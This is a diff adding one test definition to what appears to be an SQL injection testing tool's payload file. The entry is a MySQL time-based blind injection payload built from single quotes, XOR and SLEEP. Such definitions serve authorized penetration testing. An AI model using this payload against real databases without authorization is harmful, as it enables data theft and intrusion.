@@ -2170,5 +2170,24 @@
         </details>
     </test>
 
+    <test>
+        <title>MySQL &gt;= 5.0.12 SINGLE QUOTES XOR time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>%27XOR(IF([INFERENCE],SLEEP([SLEEPTIME]),0))XOR%27Z</vector>
+        <request>
+            <payload>%27XOR(IF(NOW()=SYSDATE(),SLEEP([SLEEPTIME]),0))XOR%27Z</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
     <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->
 </root>
